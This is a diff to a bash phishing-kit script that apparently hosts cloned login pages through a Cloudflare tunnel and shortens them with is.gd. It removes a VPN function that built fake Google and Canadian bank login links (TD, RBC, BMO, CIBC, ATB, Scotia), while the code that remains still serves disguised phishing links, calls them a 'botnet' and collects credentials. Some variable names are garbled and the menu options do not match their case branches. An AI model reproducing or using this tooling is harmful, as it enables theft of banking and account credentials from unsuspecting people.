@@ -105,13 +105,11 @@ header(){
 	
     printf "${BLUE}"	
 	cat <<- EOF
-          
-███████  █████╗ ██████╗  █████╗ ██╗  ██╗
-██      ██   ██╗██   ██╗██   ██╗██║  ██║
-║${RED}A TRUSTING &  LOYAL BITCH MADE FOR YOU${BLUE}║
-     ██║██   ██║██   ██╗██   ██║██║  ██║
-███████║██   ██║██   ██║██   ██║██║  ██║                                                                                                  
-${RED}${CYAN}IM CREATED${RED} ONLY FOR ${RED}EDUCATIONAL PURPOSES!  
+   ____ ____   ___   ___  _  _____ _   _       _ _   _ 
+  / ___|  _ \ / _ \ / _ \| |/ /_ _| \ | |     / | \ | |
+ | |   | |_) | | | | | | | ' / | ||  \| |_____| |  \| |
+ | |___|  _ <| |_| | |_| | . \ | || |\  |_____| | |\  |
+  \____|_| \_\\___/ \___/|_|\_\___|_| \_|     |_|_| \_|
 	EOF
 	printf "${RESETBG}"	
 }
@@ -331,50 +329,6 @@ localhost_start_manual() {
 	credentials_manual
 }
 
-express_vpn(){
-	
-		echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN} VPN STARTING ${GREEN})"
-		sleep 2 && $$ expressvpn discconect && sleep 2 && expressvpn connect "canada" && sleep 2
-			echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
-	{ sleep 1; setup_clone; }
-	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."
-
-    if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
-    else
-        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
-    fi
-
-	{ sleep 12; clear; header; }
-	
-
-
-
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
-	cldflr_url1=${cldflr_url#https://}
-
-	gmap_url="${cldflr_url}/authentication/ID=17566/040147.php"
-	gphoto_url="${cldflr_url}/authentication/ID=17567/040147.php"
-	gdrive_url="${cldflr_url}/authentication/1D=17567/040147.php"
-	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
-	url_short1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gmap_url")
-    url_short2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$player_url")
-    url_short3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gmail_url")
-	url_short4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$td_url")
-	url_short5=$(curl -s 'https://is.gd/create.php?format=simple&url='"$rbc_url")
-	url_short6=$(curl -s 'https://is.gd/create.php?format=simple&url='"$bmo_url")
-	url_short7=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cibc_url")
-	url_short8=$(curl -s 'https://is.gd/create.php?format=simple&url='"$atb_url")
-	url_short9=$(curl -s 'https://is.gd/create.php?format=simple&url='"$sco_url")
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE}============================${GREEN}[${WHITE}-${GREEN}]${WHITE}"
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} +G-MAPS : ${RED}$url_short1"
-
-		echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE}============================${GREEN}[${WHITE}-${GREEN}]${WHITE}"
-
-
-	credentials
-}
-
 		
 # Start Cloudflared
 cloudflared_start() { 
@@ -426,23 +380,13 @@ cloudflared_start() {
 
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}====-===[SARAH=BOTNET=V1]===-===${GREEN}[${WHITE}-${GREEN}]${WHITE}"
 
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} AIO G+ENERERATOR  : ${ORANGE}$url_short22"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} SARAH[ON-THE-GO] : ${ORANGE}$url_short2"
+	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} SARAH [ON-THE-GO] : ${ORANGE}$url_short2"
 
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}=======[USE WITH CAUTION]=======${GREEN}[${WHITE}-${GREEN}]${WHITE}"
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  PHOTO      : ${RED}$url_short1"
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  DRIVE      : ${RED}$url_shrt3"
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  GMAPS      : ${RED}$url_sort3"
 	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}=======[USE WITH CAUTION]=======${GREEN}[${WHITE}-${GREEN}]${WHITE}"	
-    echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  TD BANK    : ${GREEN}$url_short4"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} RBC BANK    : ${RED}$url_short5"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} BMO BANK    : ${ORANGE}$url_short6"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} CIB BANK    : ${ORANGE}$url_short7"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} ATB BANK    : ${GREEN}$url_short8"
-	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} SCO BANK    : ${RED}$url_short9"
-    echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}=======[USE WITH CAUTION]=======${GREEN}[${WHITE}-${GREEN}]${WHITE}"	
-
-
 
 	credentials
 }
@@ -572,22 +516,20 @@ tunnel_customize() {
 	{ clear; header; }
 	cat <<- EOF
 
-		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
-		${GREEN}[${WHITE}2${GREEN}]${CYAN} START VPN ${MAGENTA} (alternative)  
-		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
+		${GREEN}[${WHITE}1${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
 
 	EOF
 
 	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"
 
 	case $REPLY in 
-		   1)
+		   3)
 		    localhost_start_customize;;
 		    
 		   2)
 		    VPN;; 
 			
-		   3)
+		   1)
 			cloudflared_start_customize;;
 
 			
@@ -623,22 +565,15 @@ tunnel_manual() {
 	
 	cat <<- EOF
 
-		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
-		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
-		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
+		${GREEN}[${WHITE}1${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
 
 	EOF
 
 	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"
 
 	case $REPLY in 
-		   1)
-		    localhost_start_manual;;
-		    
-		   2)
-		    localhostrun_start_manual;; 
 			
-		   3)
+		   1)
 			cloudflared_start_manual;;
 			
 	   	
